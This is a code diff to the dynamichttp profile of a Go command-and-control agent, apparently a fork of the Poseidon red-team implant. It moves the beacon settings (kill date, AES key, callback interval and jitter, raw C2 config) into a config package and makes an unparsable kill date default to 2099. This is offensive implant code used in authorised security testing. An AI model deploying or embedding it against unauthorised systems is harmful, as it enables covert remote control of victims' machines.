@@ -18,6 +18,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
 
@@ -26,17 +27,8 @@ import (
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
 )
 
-// base64 encoded version of the JSON initial configuration of dynamichttp
-var dynamichttp_initial_config string
-
-type DynamicHTTPInitialConfig struct {
-	Killdate               string
-	Interval               uint
-	Jitter                 uint
-	EncryptedExchangeCheck bool
-	AESPSK                 string
-	RawC2Config            C2DynamicHTTPC2Config
-}
+// DynamicHTTPInitialConfig is used as a method receiver for parsing the raw C2 config JSON
+type DynamicHTTPInitialConfig struct{}
 
 func (e *DynamicHTTPInitialConfig) parseC2DynamicHTTPFunction(configArray []interface{}) []C2DynamicHTTPFunction {
 	httpFunctions := make([]C2DynamicHTTPFunction, len(configArray))
@@ -136,33 +128,6 @@ func (e *DynamicHTTPInitialConfig) parseRawC2Config(configMap map[string]interfa
 	RawC2Config.Post = postConfig
 	return RawC2Config
 }
-func (e *DynamicHTTPInitialConfig) UnmarshalJSON(data []byte) error {
-	alias := map[string]interface{}{}
-	err := json.Unmarshal(data, &alias)
-	if err != nil {
-		return err
-	}
-	if v, ok := alias["killdate"]; ok {
-		e.Killdate = v.(string)
-	}
-	if v, ok := alias["callback_interval"]; ok {
-		e.Interval = uint(v.(float64))
-	}
-	if v, ok := alias["callback_jitter"]; ok {
-		e.Jitter = uint(v.(float64))
-	}
-	if v, ok := alias["encrypted_exchange_check"]; ok {
-		e.EncryptedExchangeCheck = v.(bool)
-	}
-	if v, ok := alias["AESPSK"]; ok {
-		e.AESPSK = v.(string)
-	}
-	if v, ok := alias["raw_c2_config"]; ok {
-		e.RawC2Config = e.parseRawC2Config(v.(map[string]interface{}))
-	}
-	return nil
-}
-
 type C2DynamicHTTPFunction struct {
 	Function   string
 	Parameters []string
@@ -206,48 +171,45 @@ type C2DynamicHTTP struct {
 	interruptSleepChannel chan bool
 }
 
-// New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
+// New creates a new DynamicHTTP C2 profile from the config package and returns it
 func init() {
-	initialConfigBytes, err := base64.StdEncoding.DecodeString(dynamichttp_initial_config)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dynamichttp config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	initialConfig := DynamicHTTPInitialConfig{}
-	err = json.Unmarshal(initialConfigBytes, &initialConfig)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dynamichttp config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.DynamicHTTPKilldate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
-		utils.PrintDebug("Kill date failed to parse. Exiting.")
-		os.Exit(1)
+		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
+		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
 	}
+
 	profile := C2DynamicHTTP{
-		Key:                   initialConfig.AESPSK,
+		Key:                   config.DynamicHTTPAesPsk,
 		Killdate:              killDateTime,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
 		interruptSleepChannel: make(chan bool, 1),
 	}
 
-	// Convert sleep from string to integer
-	profile.Interval = int(initialConfig.Interval)
+	profile.Interval = config.DynamicHTTPInterval
 	if profile.Interval < 0 {
 		profile.Interval = 0
 	}
 
-	// Convert jitter from string to integer
-	profile.Jitter = int(initialConfig.Jitter)
+	profile.Jitter = config.DynamicHTTPJitter
 	if profile.Jitter < 0 {
 		profile.Jitter = 0
 	}
 
-	// Add Agent Configuration
-	profile.Config = initialConfig.RawC2Config
-	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+	// Parse raw C2 config from the config string
+	parser := &DynamicHTTPInitialConfig{}
+	if config.DynamicHTTPRawC2Config != "" {
+		configMap := map[string]interface{}{}
+		if err := json.Unmarshal([]byte(config.DynamicHTTPRawC2Config), &configMap); err != nil {
+			utils.PrintDebug(fmt.Sprintf("error parsing raw c2 config: %v\n", err))
+		} else {
+			profile.Config = parser.parseRawC2Config(configMap)
+		}
+	}
+
+	profile.ExchangingKeys = config.DynamicHTTPEncryptedExchange
 	RegisterAvailableC2Profile(&profile)
 }
 
